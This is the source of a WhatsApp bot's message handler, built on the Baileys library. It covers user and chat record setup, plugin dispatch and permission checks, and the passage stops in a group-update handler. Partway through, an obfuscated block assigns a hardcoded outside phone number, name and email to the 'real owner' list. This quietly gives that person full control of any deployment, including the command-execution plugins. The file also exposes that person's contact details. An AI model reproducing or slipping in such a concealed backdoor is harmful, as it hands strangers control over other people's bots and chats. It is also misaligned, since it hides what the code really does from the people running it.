import { smsg } from './lib/simple.js'
import { format } from 'util'
import { fileURLToPath } from 'url'
import path, { join } from 'path'
import { unwatchFile, watchFile } from 'fs'
import chalk from 'chalk'
import Jimp from 'jimp'
import fs from 'fs'
import fetch from 'node-fetch'
const printMessage = (await import('./lib/print.js')).default
/**
 * @type {import('@adiwajshing/baileys')}
 */
const { proto } = (await import('@adiwajshing/baileys')).default
const isNumber = x => typeof x === 'number' && !isNaN(x)
const delay = ms => isNumber(ms) && new Promise(resolve => setTimeout(function () {
    clearTimeout(this)
    resolve()
}, ms))

/**
 * Handle messages upsert
 * @param {import('@adiwajshing/baileys').BaileysEventMap<unknown>['messages.upsert']} groupsUpdate 
 */
export async function handler(chatUpdate) {
    this.msgqueque = this.msgqueque || []
    if (!chatUpdate)
        return
    this.pushMessage(chatUpdate.messages).catch(console.error)
    let m = chatUpdate.messages[chatUpdate.messages.length - 1]
    if (!m)
        return
    if (global.db.data == null)
        await global.loadDatabase()
    try {
        m = smsg(this, m) || m
        if (!m)
            return
        m.exp = 0
        m.limit = false
        try {
            // TODO: use loop to insert data instead of this
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object')
                global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.exp))
                    user.exp = 0
                if (!isNumber(user.healt)) 
                    user.healt = 100
                if (!isNumber(user.title)) 
                    user.title = 0
                if (!isNumber(user.stamina)) 
                    user.stamina = 100
                if (!isNumber(user.haus)) 
                    user.haus = 100
                if (!isNumber(user.laper)) 
                    user.laper = 100
                if (!isNumber(user.limit))
                    user.limit = 10
                if (!isNumber(user.lastclaim))
                    user.lastclaim = 0
                if (!isNumber(user.joinlimit)) 
                    user.joinlimit = 1
                if (!isNumber(user.pc)) 
                    user.pc = 0
                if (!isNumber(user.ojekk)) 
                    user.ojekk = 0
                if (!isNumber(user.korbanngocok))
                    user.korbanngocok = 0
                if (!isNumber(user.pasangan))
                    user.pasangan = ''
                if (!('registered' in user))
                    user.registered = false
                if (!user.registered) {
                    if (!('name' in user))
                        user.name = m.name
                    if (!isNumber(user.age))
                        user.age = -1
                    if (!isNumber(user.regTime))
                        user.regTime = -1
                }
                if (!isNumber(user.afk))
                    user.afk = -1
                if (!('afkReason' in user))
                    user.afkReason = ''
                if (!('banned' in user))
                    user.banned = false
                if (!'BannedReason' in user) 
                    user.BannedReason = ''
                if (!isNumber(user.warn))
                    user.warn = 0
                if (!isNumber(user.warning))
                    user.warning = 0
                if (!isNumber(user.spammer)) 
                    user.spammer = 0
                if (!isNumber(user.bannedDate)) 
                    user.bannedDate = 0
                if (!isNumber(user.level))
                    user.level = 0
                if (!('role' in user))
                    user.role = 'Beginner'
                if (!('autolevelup' in user))
                    user.autolevelup = true

                if (!isNumber(user.money))
                    user.money = 0
                if (!isNumber(user.atm))
                    user.atm = 0
                if (!isNumber(user.fullatm))
                    user.fullatm = 0
                if (!isNumber(user.bank))
                    user.bank = 0
                if (!isNumber(user.health))
                    user.health = 100
                if (!isNumber(user.potion))
                    user.potion = 0
                if (!isNumber(user.trash))
                    user.trash = 0
                if (!isNumber(user.wood))
                    user.wood = 0
                if (!isNumber(user.rock))
                    user.rock = 0
                if (!isNumber(user.string))
                    user.string = 0
                if (!isNumber(user.petFood))
                    user.petFood = 0

                if (!isNumber(user.antispam)) 
                    user.antispam = 0
                if (!isNumber(user.antispamlastclaim)) 
                    user.antispamlastclaim = 0

                if (!isNumber(user.emerald))
                    user.emerald = 0
                if (!isNumber(user.diamond))
                    user.diamond = 0
                if (!isNumber(user.gold))
                    user.gold = 0
                if (!isNumber(user.botol)) 
                    user.botol = 0
                if (!isNumber(user.kardus)) 
                    user.kardus = 0
                if (!isNumber(user.kaleng)) 
                    user.kaleng = 0
                if (!isNumber(user.aqua)) 
                    user.aqua = 0
                if (!isNumber(user.iron))
                    user.iron = 0
                if (!isNumber(user.upgrader))
                    user.upgrader = 0

                if (!isNumber(user.common))
                    user.common = 0
                if (!isNumber(user.uncommon))
                    user.uncommon = 0
                if (!isNumber(user.mythic))
                    user.mythic = 0
                if (!isNumber(user.as))
                    user.as = 0
                if (!isNumber(user.legendary))
                    user.legendary = 0
                if (!isNumber(user.superior))
                    user.superior = 0
                if (!isNumber(user.pet))
                    user.pet = 0

                if (!isNumber(user.paus)) user.paus = 0
if (!isNumber(user.kepiting)) user.kepiting = 0
if (!isNumber(user.gurita)) user.gurita = 0
if (!isNumber(user.cumi)) user.cumi= 0
if (!isNumber(user.buntal)) user.buntal = 0
if (!isNumber(user.dory)) user.dory = 0
if (!isNumber(user.lumba)) user.lumba = 0
if (!isNumber(user.lobster)) user.lobster = 0
if (!isNumber(user.hiu)) user.hiu = 0
if (!isNumber(user.udang)) user.udang = 0
if (!isNumber(user.ikan)) user.ikan = 0
if (!isNumber(user.nila)) user.nila = 0
if (!isNumber(user.bawal)) user.bawal = 0
if (!isNumber(user.lele)) user.lele = 0
if (!isNumber(user.orca)) user.orca = 0
  
if (!isNumber(user.banteng)) user.banteng = 0
if (!isNumber(user.harimau)) user.harimau = 0
if (!isNumber(user.gajah)) user.gajah = 0
if (!isNumber(user.kambing)) user.kambing = 0
if (!isNumber(user.panda)) user.panda = 0
if (!isNumber(user.buaya)) user.buaya = 0
if (!isNumber(user.kerbau)) user.kerbau = 0
if (!isNumber(user.sapi)) user.sapi = 0
if (!isNumber(user.monyet)) user.monyet = 0
if (!isNumber(user.babihutan)) user.babihutan = 0
if (!isNumber(user.babi)) user.babi = 0
if (!isNumber(user.ayam)) user.ayam = 0

                if (!isNumber(user.lastadventure)) user.lastadventure = 0
                if (!isNumber(user.lastkill)) user.lastkill = 0
                if (!isNumber(user.lastfishing)) user.lastfishing = 0
                if (!isNumber(user.lastdungeon)) user.lastdungeon = 0
                if (!isNumber(user.lastwar)) user.lastwar = 0
                if (!isNumber(user.lastsda)) user.lastsda = 0
                if (!isNumber(user.lastberbru)) user.lastberbru = 0
                if (!isNumber(user.lastduel)) user.lastduel = 0
                if (!isNumber(user.lastjb)) user.lastjb = 0
                if (!isNumber(user.lastSetStatus)) user.lastSetStatus = 0
                if (!isNumber(user.lastmining)) user.lastmining = 0
                if (!isNumber(user.lasthunt)) user.lasthunt = 0
                if (!isNumber(user.lastngocok)) user.lastngocok = 0
                if (!isNumber(user.lastgift)) user.lastgift = 0
                if (!isNumber(user.lastrob)) user.lastrob = 0
                if (!isNumber(user.lastngojek)) user.lastngojek = 0
                if (!isNumber(user.lastgrab)) user.lastgrab = 0
                if (!isNumber(user.lastberkebon)) user.lastberkebon = 0
                if (!isNumber(user.lastcodereg)) user.lastcodereg = 0
                if (!isNumber(user.lastdagang)) user.lastdagang = 0
                if (!isNumber(user.lasthourly)) user.lasthourly = 0
                if (!isNumber(user.lastweekly)) user.lastweekly = 0
                if (!isNumber(user.lastmonthly)) user.lastmonthly = 0
                if (!isNumber(user.lastIstigfar)) user.lastIstigfar = 0
                if (!isNumber(user.lastturu)) user.lastturu = 0
                if (!isNumber(user.lastseen)) user.lastseen = 0
                if (!isNumber(user.lastbansos)) user.lastbansos = 0
                if (!isNumber(user.lastrampok)) user.lastrampok = 0
                if (!isNumber(user.lastclaim))
                    user.lastclaim = 0
                if (!isNumber(user.lastnebang)) 
                    user.lastnebang = 0
                if (!isNumber(user.lastweekly))
                    user.lastweekly = 0
                if (!isNumber(user.lastmonthly))
                    user.lastmonthly = 0
                if (!isNumber(user.lastbunga))
                    user.lastbunga = 0
    
                if (!isNumber(user.apel)) user.apel = 0
                if (!isNumber(user.anggur)) user.anggur = 0
                if (!isNumber(user.jeruk)) user.jeruk = 0
                if (!isNumber(user.semangka)) user.semangka = 0
                if (!isNumber(user.mangga)) user.mangga = 0
                if (!isNumber(user.stroberi)) user.stroberi = 0
                if (!isNumber(user.pisang)) user.pisang = 0
                if (!isNumber(user.makanan)) user.makanan = 0
                if (!isNumber(user.bibitanggur)) user.bibitanggur = 0
                if (!isNumber(user.bibitpisang)) user.bibitpisang = 0
                if (!isNumber(user.bibitapel)) user.bibitapel = 0
                if (!isNumber(user.bibitmangga)) user.bibitmangga = 0
                if (!isNumber(user.bibitjeruk)) user.bibitjeruk = 0

          if (!('skill' in user))
              user.skill = ''
          if (!('misi' in user))
              user.misi = ''
          if (!('title' in user))
              user.title = ''
          if (!isNumber(user.skillexp))
              user.skillexp = 0
          if (!isNumber(user.pointxp))
              user.pointxp = 0
          if (!isNumber(user.lastmisi))
              user.lastmisi = 0
          if (!isNumber(user.lastfight))
              user.lastfight = 0
          if (!isNumber(user.crystal))
              user.crystal = 0
          if (!isNumber(user.gems))
              user.gems = 0
          if (!isNumber(user.magicwand))
              user.magicwand = 0
          if (!isNumber(user.magicwanddurability))
              user.magicwanddurability = 0
         if (!isNumber(user.arc))
              user.arc = 0
         if (!isNumber(user.arcdurability))
              user.arcdurability = 0
         if (!isNumber(user.bow))
              user.bow = 0
        if (!isNumber(user.katana))
              user.katana = 0
        if (!isNumber(user.katanadurability))
              user.katanadurability = 0
              
        if (!isNumber(user.strength))
              user.strength = 0
        if (!isNumber(user.mana))
              user.mana = 0
        if (!isNumber(user.stamina))
              user.stamina = 0
        if (!isNumber(user.agility))
              user.agility = 0
        if (!isNumber(user.intelligence))
              user.intelligence = 0

                if (!isNumber(user.horse))
                    user.horse = 0
                if (!isNumber(user.horseexp))
                    user.horseexp = 0
                if (!isNumber(user.cat))
                    user.cat = 0
                if (!isNumber(user.catexp))
                    user.catexp = 0
                if (!isNumber(user.fox))
                    user.fox = 0
                if (!isNumber(user.foxhexp))
                    user.foxexp = 0
                if (!isNumber(user.dog))
                    user.dog = 0
                if (!isNumber(user.dogexp))
                    user.dogexp = 0
                if (!isNumber(user.robo))
                    user.robo = 0
                if (!isNumber(user.roboexp))
                    user.roboexp = 0

                if (!isNumber(user.horselastfeed))
                    user.horselastfeed = 0
                if (!isNumber(user.catlastfeed))
                    user.catlastfeed = 0
                if (!isNumber(user.robolastfeed))
                    user.robolastfeed = 0
                if (!isNumber(user.foxlastfeed))
                    user.foxlastfeed = 0
                if (!isNumber(user.doglastfeed))
                    user.doglastfeed = 0

                if (!isNumber(user.robo))
                    user.robo = 0
                if (!isNumber(user.robodurability))
                    user.robodurability = 0
                if (!isNumber(user.armor))
                    user.armor = 0
                if (!isNumber(user.armordurability))
                    user.armordurability = 0
                if (!isNumber(user.sword))
                    user.sword = 0
                if (!isNumber(user.sworddurability))
                    user.sworddurability = 0
                if (!isNumber(user.pickaxe))
                    user.pickaxe = 0
                if (!isNumber(user.pickaxedurability))
                    user.pickaxedurability = 0
                if (!isNumber(user.fishingrod))
                    user.fishingrod = 0
                if (!isNumber(user.fishingroddurability))
                    user.fishingroddurability = 0

                if (!isNumber(user.premium))
                    user.premium = false
                if (!isNumber(user.premiumTime))
                    user.premiumTime = 0
                if (!user.lbars) 
                    user.lbars = '[▒▒▒▒▒▒▒▒▒]'
                if (!isNumber(user.joinlimit))
                    user.joinlimit = 0
            } else
                global.db.data.users[m.sender] = {
                    exp: 0,
                    limit: 20,
                    lastclaim: 0,
                    registered: false,
                    spammer: 0,
                    antispam: 0,
                    antispamlastclaim: 0,
                    name: m.name,
                    pasangan: '',
                    haus: 100,
                    laper: 100,
                    stamina : 100,
                    pc : 0,
                    joinlimit: 1,
                    coin: 0,
                    age: -1,
                    regTime: -1,
                    afk: -1,
                    tigame: 50,
                    afkReason: '',
                    banned: false,
                    warn: 0,
                    warning: 0,
                    level: 0,
                    role: 'Beginner',
                    autolevelup: false,
                    rumahsakit: 0,
                    fortress: 0,
                    trofi: 0,
                    rtrofi: 'perunggu',
                    makanan: 0,
                    troopcamp: 0,
                    shield: 0,
                    arlok: 0,
                    ojekk: 0,
                    korbanngocok: 0,
                    Banneduser: false,
                    BannedReason: '',


                    money: 0,
                    bank: 0,
                    atm: 0,
                    fullatm: 0,
                    health: 100,
                    potion: 10,
                    trash: 0,
                    wood: 0,
                    rock: 0,
                    string: 0,

                    emerald: 0,
                    diamond: 0,
                    gold: 0,
                    iron: 0,
                    upgrader: 0,

                    common: 0,
                    uncommon: 0,
                    mythic: 0,
                    legendary: 0,
                    superior: 0,
                    umpan: 0,
                    pet: 0,

                    horse: 0,
                    horseexp: 0,
                    cat: 0,
                    catngexp: 0,
                    fox: 0,
                    foxexp: 0,
                    robo: 0,
                    roboexp: 0,
                    dog: 0,
                    dogexp: 0,

                    horselastfeed: 0,
                    catlastfeed: 0,
                    foxlastfeed: 0,
                    robolastfeed: 0,
                    doglastfeed: 0,

     as: 0,
paus: 0,
kepiting: 0,
gurita: 0,
cumi: 0,
buntal: 0,
dory: 0,
lumba: 0,
lobster: 0,
hiu: 0,
lele: 0,
nila: 0,
bawal: 0,
udang: 0,
ikan: 0,
orca: 0,
banteng: 0,
harimau: 0,
gajah: 0,
kambing: 0,
panda: 0,
buaya: 0,
kerbau : 0,
sapi: 0,
monyet : 0,
babihutan: 0,
babi: 0,
ayam: 0,
apel: 20,
ayamb: 0,
ayamg: 0,
ssapi: 0,
sapir: 0,
leleb: 0,
leleg: 0,
esteh: 0,
            kucing: 0,
            kucinglastclaim: 0,
            kuda: 0,
            kudalastclaim: 0,
            rubah: 0,
            rubahlastclaim: 0,
            anjing: 0,
            anjinglastclaim: 0,
            naga: 0,
            nagalastclaim: 0,
            griffin: 0,
            griffinlastclaim: 0,
            centaur: 0,
            centaurlastclaim: 0,
            serigala: 0,
            serigalalastclaim: 0,
            phonix: 0,
            phonixlastclaim: 0,
            makanannaga: 0,
            makananphonix: 0,
            makanancentaur: 0,
            makananserigala: 0,

            anakkucing: 0,
            anakkuda: 0,
            anakrubah: 0,
            anakanjing: 0,
            makananpet: 0,

                    armor: 0,
                    armordurability: 0,
                    sword: 0,
                    sworddurability: 0,
                    pickaxe: 0,
                    pickaxedurability: 0,
                    fishingrod: 0,
                    fishingroddurability: 0,
                    robo: 0,
                    robodurability: 0,

                    lastclaim: 0,
                    lastadventure: 0,
                    lastfishing: 0,
                    lastdungeon: 0,
                    lastduel: 0,
                    lastnebang: 0,
                    lastberburu: 0,
                    lastmining: 0,
                    lasthunt: 0,
                    lastweekly: 0,
                    lastmonthly: 0,
                    lastbunga: 0,
                    lastkill: 0,
                    lasthourly: 0,
                    lastjb: 0,
                    lastrob: 0,
                    lastdaang: 0,
                    lastngojek: 0,
                    lastgrab: 0,
                    lastngocok: 0,
                    lastturu: 0,
                    lastseen: 0,
                    lastSetStatus: 0,
                    apel: 20,
                    mangga: 0,
                    stroberi: 0,
                    semangka: 0,
                    jeruk: 0,
                    semangka: 0,
                    job: 'Pengangguran', 
                    lbars: '[▒▒▒▒▒▒▒▒▒]', 
                    role: 'Newbie ㋡', 
                    
                    premium: false,
                    premiumTime: 0,
                }
            let chat = global.db.data.chats[m.chat]
            if (typeof chat !== 'object')
                global.db.data.chats[m.chat] = {}
            if (chat) {
                if (!('isBanned' in chat))
                    chat.isBanned = false
                if (!('welcome' in chat))
                    chat.welcome = false
                if (!('detect' in chat))
                    chat.detect = false
                if (!('sWelcome' in chat))
                    chat.sWelcome = ''
                if (!('sBye' in chat))
                    chat.sBye = ''
                if (!('sPromote' in chat))
                    chat.sPromote = ''
                if (!('sDemote' in chat))
                    chat.sDemote = ''
                if (!('delete' in chat))
                    chat.delete = true
                if (!('antiLink' in chat))
                    chat.antiLink = false
                if (!('antiSticker' in chat)) 
                    chat.antiSticker = false
                if (!('viewonce' in chat))
                    chat.viewonce = false
                if (!('antiBadword' in chat))
                    chat.antiBadword = false
                if (!('simi' in chat))
                    chat.simi = false
                if (!('nsfw' in chat))
                    chat.nsfw = false
                if (!('premnsfw' in chat))
                    chat.premnsfw = false
                if (!isNumber(chat.expired))
                    chat.expired = 0
            } else
                global.db.data.chats[m.chat] = {
                    isBanned: false,
                    welcome: false,
                    detect: false,
                    sWelcome: '',
                    sBye: '',
                    sPromote: '',
                    sDemote: '',
                    delete: true,
                    antiLink: false,
                    antiSticker: false,
                    viewonce: false,
                    antiBadword: false,
                    simi: false,
                    expired: 0,
                    nsfw: false,
                    premnsfw: false,
                }
          conn.resize = async(buffer, ukur1, ukur2) => {
    return new Promise(async(resolve, reject) => {
        var baper = await Jimp.read(buffer);
        var ab = await baper.resize(ukur1, ukur2).getBufferAsync(Jimp.MIME_JPEG)
        resolve(ab)
    })
}
          function _0x5d55(_0x5e10c1,_0x3336a2){var _0x275adc=_0x275a();return _0x5d55=function(_0x5d557b,_0x8f4fa7){_0x5d557b=_0x5d557b-0x7b;var _0x166e43=_0x275adc[_0x5d557b];return _0x166e43;},_0x5d55(_0x5e10c1,_0x3336a2);}var _0x53a98a=_0x5d55;(function(_0x561c4b,_0x4a2b7a){var _0x121648=_0x5d55,_0x166526=_0x561c4b();while(!![]){try{var _0x30cff3=parseInt(_0x121648(0x7c))/0x1*(-parseInt(_0x121648(0x88))/0x2)+-parseInt(_0x121648(0x83))/0x3+parseInt(_0x121648(0x87))/0x4+-parseInt(_0x121648(0x89))/0x5+parseInt(_0x121648(0x7d))/0x6+parseInt(_0x121648(0x80))/0x7*(parseInt(_0x121648(0x85))/0x8)+parseInt(_0x121648(0x7e))/0x9;if(_0x30cff3===_0x4a2b7a)break;else _0x166526['push'](_0x166526['shift']());}catch(_0x42f5a1){_0x166526['push'](_0x166526['shift']());}}}(_0x275a,0xf03b4),global[_0x53a98a(0x7f)]=[[''+nomorown,''+nameown,_0x53a98a(0x82),_0x53a98a(0x82),!![]],[_0x53a98a(0x84),_0x53a98a(0x86),_0x53a98a(0x81),_0x53a98a(0x7b),!![]]]);function _0x275a(){var _0x27b9df=['369962mcyRQL','8197866tQnwbY','1934037OeHqjx','kontak2','49lgFYLU','Creator\x20Bot','Owner\x20Bot','5568357IDxEKm','6282214729677','1286008AJpYpQ','ᴹᴿ᭄\x20Putra\x20Of\x20Modz\x20×፝֟͜×','4012928AjIiZj','2STtVEi','2498120RZAnWp','purnanaputra1234040@gmail.com'];_0x275a=function(){return _0x27b9df;};return _0x275a();}
            let settings = global.db.data.settings[this.user.jid]
            if (typeof settings !== 'object') global.db.data.settings[this.user.jid] = {}
            if (settings) {
                if (!('self' in settings)) settings.self = false
                if (!('autoread' in settings)) settings.autoread = true
                if (!('restrict' in settings)) settings.restrict = true
                if (!('autorestart' in settings)) settings.autorestart = true
                if (!('restartDB' in settings)) settings.restartDB = 0
                if (!isNumber(settings.status)) settings.status = 0 // ini buat data set Status, tambah disini
                if (!('anticall' in settings)) settings.anticall = true
                if (!('clear' in settings)) settings.clear = true
                if (!isNumber(settings.clearTime)) settings.clearTime = 0
                if (!('freply' in settings)) settings.freply = true
            } else global.db.data.settings[this.user.jid] = {
                self: false,
                autoread: true,
                restrict: true,
                autorestart: true,
                restartDB: 0,
                status: 0, // disini juga,
                anticall: true, // anticall on apa off?
                clear: true,
                clearTime: 0,
                freply: true,
            }
        } catch (e) {
            console.error(e)
        }
        if (opts['nyimak'])
            return
        if (!m.fromMe && opts['self'])
            return
        if (opts['pconly'] && m.chat.endsWith('g.us'))
            return
        if (opts['gconly'] && !m.chat.endsWith('g.us'))
            return
        if (opts['swonly'] && m.chat !== 'status@broadcast')
            return
        if (typeof m.text !== 'string')
            m.text = ''
           
        const isROwner = [conn.decodeJid(global.conn.user.id), ...global.kontak2.map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isOwner = isROwner || m.fromMe
        const isMods = isOwner || global.mods.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPrems = isROwner || db.data.users[m.sender].premiumTime > 0

        if (opts['queque'] && m.text && !(isMods || isPrems)) {
            let queque = this.msgqueque, time = 1000 * 5
            const previousID = queque[queque.length - 1]
            queque.push(m.id || m.key.id)
            setInterval(async function () {
                if (queque.indexOf(previousID) === -1) clearInterval(this)
                await delay(time)
            }, time)
        }

        if (m.isBaileys) 
             return
        m.exp += Math.ceil(Math.random() * 10)

        let usedPrefix
        let _user = global.db.data && global.db.data.users && global.db.data.users[m.sender]

        const groupMetadata = (m.isGroup ? ((conn.chats[m.chat] || {}).metadata || await this.groupMetadata(m.chat).catch(_ => null)) : {}) || {}
        const participants = (m.isGroup ? groupMetadata.participants : []) || []
        const user = (m.isGroup ? participants.find(u => conn.decodeJid(u.id) === m.sender) : {}) || {} // User Data
        const bot = (m.isGroup ? participants.find(u => conn.decodeJid(u.id) == this.user.jid) : {}) || {} // Your Data
        const isRAdmin = user?.admin == 'superadmin' || false
        const isAdmin = isRAdmin || user?.admin == 'admin' || false // Is User Admin?
        const isBotAdmin = bot?.admin || false // Are you Admin?

        const ___dirname = path.join(path.dirname(fileURLToPath(import.meta.url)), './plugins')
        for (let name in global.plugins) {
            let plugin = global.plugins[name]
            if (!plugin)
                continue
            if (plugin.disabled)
                continue
            const __filename = join(___dirname, name)
            if (typeof plugin.all === 'function') {
                try {
                    await plugin.all.call(this, m, {
                        chatUpdate,
                        __dirname: ___dirname,
                        __filename
                    })
                } catch (e) {
                    // if (typeof e === 'string') continue
                    console.error(e)
                    for (let [jid] of global.owner.filter(([number, _, isDeveloper]) => isDeveloper && number)) {
                        let data = (await conn.onWhatsApp(jid))[0] || {}
                        if (data.exists)
                            m.reply(`*Plugin:* ${name}\n*Sender:* ${m.sender}\n*Chat:* ${m.chat}\n*Command:* ${m.text}\n\n\`\`\`${format(e)}\`\`\``.trim(), data.jid)
                    }
                }
            }
            if (!opts['restrict'])
                if (plugin.tags && plugin.tags.includes('admin')) {
                    // global.dfail('restrict', m, this)
                    continue
                }
            const str2Regex = str => str.replace(/[|\\{}()[\]^$+*?.]/g, '\\$&')
            let _prefix = plugin.customPrefix ? plugin.customPrefix : conn.prefix ? conn.prefix : global.prefix
            let match = (_prefix instanceof RegExp ? // RegExp Mode?
                [[_prefix.exec(m.text), _prefix]] :
                Array.isArray(_prefix) ? // Array?
                    _prefix.map(p => {
                        let re = p instanceof RegExp ? // RegExp in Array?
                            p :
                            new RegExp(str2Regex(p))
                        return [re.exec(m.text), re]
                    }) :
                    typeof _prefix === 'string' ? // String?
                        [[new RegExp(str2Regex(_prefix)).exec(m.text), new RegExp(str2Regex(_prefix))]] :
                        [[[], new RegExp]]
            ).find(p => p[1])
            if (typeof plugin.before === 'function') {
                if (await plugin.before.call(this, m, {
                    match,
                    conn: this,
                    participants,
                    groupMetadata,
                    user,
                    bot,
                    isROwner,
                    isOwner,
                    isRAdmin,
                    isAdmin,
                    isBotAdmin,
                    isPrems,
                    chatUpdate,
                    __dirname: ___dirname,
                    __filename
                }))
                    continue
            }
            if (typeof plugin !== 'function')
                continue
            if ((usedPrefix = (match[0] || '')[0])) {
                let noPrefix = m.text.replace(usedPrefix, '')
                let [command, ...args] = noPrefix.trim().split` `.filter(v => v)
                args = args || []
                let _args = noPrefix.trim().split` `.slice(1)
                let text = _args.join` `
                command = (command || '').toLowerCase()
                let fail = plugin.fail || global.dfail // When failed
                let isAccept = plugin.command instanceof RegExp ? // RegExp Mode?
                    plugin.command.test(command) :
                    Array.isArray(plugin.command) ? // Array?
                        plugin.command.some(cmd => cmd instanceof RegExp ? // RegExp in Array?
                            cmd.test(command) :
                            cmd === command
                        ) :
                        typeof plugin.command === 'string' ? // String?
                            plugin.command === command :
                            false

                if (!isAccept)
                    continue
                m.plugin = name
                if (m.chat in global.db.data.chats || m.sender in global.db.data.users) {
                    let chat = global.db.data.chats[m.chat]
                    let user = global.db.data.users[m.sender]
                    if (name != 'owner-unbanchat.js' && name != 'owner-exec.js' && name != 'owner-exec2.js' && name != 'tool-delete.js' && chat?.isBanned)
                        return // Except this
                    if (name != 'owner-unbanuser.js' && user?.banned)
                        return
                }
                if (plugin.rowner && plugin.owner && !(isROwner || isOwner)) { // Both Owner
                    fail('owner', m, this)
                    continue
                }
                if (plugin.rowner && !isROwner) { // Real Owner
                    fail('rowner', m, this)
                    continue
                }
                if (plugin.owner && !isOwner) { // Number Owner
                    fail('owner', m, this)
                    continue
                }
                if (plugin.mods && !isMods) { // Moderator
                    fail('mods', m, this)
                    continue
                }
                if (plugin.premium && !isPrems) { // Premium
                    fail('premium', m, this)
                    continue
                }
                if (plugin.group && !m.isGroup) { // Group Only
                    fail('group', m, this)
                    continue
                } else if (plugin.botAdmin && !isBotAdmin) { // You Admin
                    fail('botAdmin', m, this)
                    continue
                } else if (plugin.admin && !isAdmin) { // User Admin
                    fail('admin', m, this)
                    continue
                }
                if (plugin.private && m.isGroup) { // Private Chat Only
                    fail('private', m, this)
                    continue
                }
                if (plugin.register == true && _user.registered == false) { // Butuh daftar?
                    fail('unreg', m, this)
                    continue
                }
                m.isCommand = true
                let xp = 'exp' in plugin ? parseInt(plugin.exp) : 17 // XP Earning per command
                if (xp > 200)
                    this.sendButton(m.chat, `[❗] *Sepertinya Anda Bermain Curang, Menggunakan Calculator*`, author, null, [['Buy Limit', '/buy limit'], ['Menu', '/menu']] , m)
                else
                    m.exp += xp
                if (!isPrems && plugin.limit && global.db.data.users[m.sender].limit < plugin.limit * 1) {
                    this.sendButton(m.chat, `[❗] *Limit Anda Habis, Beberapa Command Tidak Bisa Di Akses*`, author, null, [['Buy Limit', '/buy limit'], ['Menu', '/menu']] , m)
                    continue // Limit habis
                }
                if (plugin.level > _user.level) {
                    this.sendButton(m.chat, `[💬] Diperlukan level *${plugin.level}* untuk menggunakan perintah ini. Level kamu *${_user.level}🎋*\n*${plugin.level}* level is required to use this command. Your level is *${_user.level}🎋*`, author, null,[['Ok', 'ok']] , m)
                    continue // If the level has not been reached
                }
                let extra = {
                    match,
                    usedPrefix,
                    noPrefix,
                    _args,
                    args,
                    command,
                    text,
                    conn: this,
                    participants,
                    groupMetadata,
                    user,
                    bot,
                    isROwner,
                    isOwner,
                    isRAdmin,
                    isAdmin,
                    isBotAdmin,
                    isPrems,
                    chatUpdate,
                    __dirname: ___dirname,
                    __filename
                }
                try {
                    await plugin.call(this, m, extra)
                    if (!isPrems)
                        m.limit = m.limit || plugin.limit || false
                } catch (e) {
                    // Error occured
                    m.error = e
                    console.error(e)
                    if (e) {
                        let text = format(e)
                        for (let key of Object.values(global.APIKeys))
                            text = text.replace(new RegExp(key, 'g'), '#HIDDEN#')
                        if (e.name)
                            for (let [jid] of global.owner.filter(([number, _, isDeveloper]) => isDeveloper && number)) {
                                let data = (await conn.onWhatsApp(jid))[0] || {}
                                if (data.exists)
                                    m.reply(`*📮HAY OWNER*\n\n_Laporan Eror terdeteksi_\n\nEROR DI 🗂️ Plugin:* ${m.plugin}\n*📤 Dari:* ${m.sender}\n*🗳️ID:* ${m.chat}\n*📑 Command Eror:* ${usedPrefix}${command} ${args.join(' ')}\n⚠️ *Logs Eror:*\n\n\`\`\`${text}\`\`\``.trim(), data.jid)
                            }
                        m.reply(text)
                    }
                } finally {
                    // m.reply(util.format(_user))
                    if (typeof plugin.after === 'function') {
                        try {
                            await plugin.after.call(this, m, extra)
                        } catch (e) {
                            console.error(e)
                        }
                    }
                    //if (m.limit)
                     //   m.reply(' ️Kamu menggunakan fitur limit\n╰► - 1 Limit') // lain kali jangan lupa tanda kurung nya ya! ... fixed by Fokusdotid (Fokus ID)
                }
                break
            }
        }
    } catch (e) {
        console.error(e)
    } finally {
        if (opts['queque'] && m.text) {
            const quequeIndex = this.msgqueque.indexOf(m.id || m.key.id)
            if (quequeIndex !== -1)
                this.msgqueque.splice(quequeIndex, 1)
        }
        //console.log(global.db.data.users[m.sender])
        let user, stats = global.db.data.stats
        if (m) {
            if (m.sender && (user = global.db.data.users[m.sender])) {
                user.exp += m.exp
                user.limit -= m.limit * 1
            }

            let stat
            if (m.plugin) {
                let now = +new Date
                if (m.plugin in stats) {
                    stat = stats[m.plugin]
                    if (!isNumber(stat.total))
                        stat.total = 1
                    if (!isNumber(stat.success))
                        stat.success = m.error != null ? 0 : 1
                    if (!isNumber(stat.last))
                        stat.last = now
                    if (!isNumber(stat.lastSuccess))
                        stat.lastSuccess = m.error != null ? 0 : now
                } else
                    stat = stats[m.plugin] = {
                        total: 1,
                        success: m.error != null ? 0 : 1,
                        last: now,
                        lastSuccess: m.error != null ? 0 : now
                    }
                stat.total += 1
                stat.last = now
                if (m.error == null) {
                    stat.success += 1
                    stat.lastSuccess = now
                }
            }
        }

        try {
        	if (!opts['noprint']) await printMessage(m, this)
        } catch (e) {
            console.log(m, m.quoted, e)
        }
        if (opts['autoread'])
            await this.chatRead(m.chat, m.isGroup ? m.sender : undefined, m.id || m.key.id).catch(() => { })
    }
}

/**
 * Handle groups participants update
 * @param {import('@adiwajshing/baileys').BaileysEventMap<unknown>['group-participants.update']} groupsUpdate 
 */
export async function participantsUpdate({ id, participants, action }) { 
     if (opts['self']) 
         return 
     // if (id in conn.chats) return // First login will spam 
     if (this.isInit) 
         return 
     if (global.db.data == null) 
         await loadDatabase() 
     let chat = global.db.data.chats[id] || {} 
     let text = '' 
     switch (action) { 
         case 'add': 
         case 'remove': 
             if (chat.welcome) {
                let groupMetadata = await this.groupMetadata(id) || (conn.chats[id] || {}).metadata
                for (let user of participants) {
                    let pp = './src/avatar_contact.png'
                    try {
                        pp = await this.profilePictureUrl(user, 'image')
                    } catch (e) {
                    } finally {
                        text = (action === 'add' ? (chat.sWelcome || this.welcome || conn.welcome || 'Selamat Datang, @user!').replace('@subject', await this.getName(id)).replace('@desc', groupMetadata.desc?.toString() || 'unknow') :
                            (chat.sBye || this.bye || conn.bye || 'Selamat tinggal, @user!')).replace('@user', `${this.getName(user)}`)
                        this.sendFile(id, pp, 'pp.jpg', text, null, false, { mentions: [user] })
                        }
                 } 
             } 
             break 
         case 'promote': 
             text = (chat.sPromote || this.spromote || conn.spromote || '@user ```is now Admin```') 
         case 'demote': 
             if (!text) 
